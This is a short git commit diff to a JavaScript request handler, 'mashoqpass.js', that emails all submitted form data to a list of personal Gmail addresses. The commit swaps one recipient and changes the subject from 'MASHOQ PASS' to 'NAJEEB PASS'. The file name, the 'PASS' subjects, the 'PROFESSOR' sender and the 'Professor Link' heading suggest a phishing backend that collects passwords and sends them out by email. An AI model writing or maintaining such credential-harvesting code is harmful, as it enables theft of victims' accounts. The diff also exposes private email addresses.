1bcb403290d01c454e44e1d16cfd25d30b61eaaa
nicklarson7778-gif <nick.larson.7778@gmail.com>
2026-01-19 20:14:07 +0500

    Update mashoqpass.js

--- mashoqpass.js
+++ mashoqpass.js
@@ -37,8 +37,8 @@ export default async function handler(req, res) {
     // ✅ Send email
     await transporter.sendMail({
       from: `"PROFESSOR" <${process.env.SMTP_USER}>`,
-      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,bilawal.king.part1@gmail.com",
-      subject: "MASHOQ PASS",
+      to: "mahboobalinizamani@gmail.com,rnxsxnnxnx@gmail.com,waheednizamani043@gmail.com",
+      subject: "NAJEEB PASS",
       text: JSON.stringify(formData, null, 2),
       html: `<h3>Professor Link</h3><pre>${JSON.stringify(formData, null, 2)}</pre>`,
     });
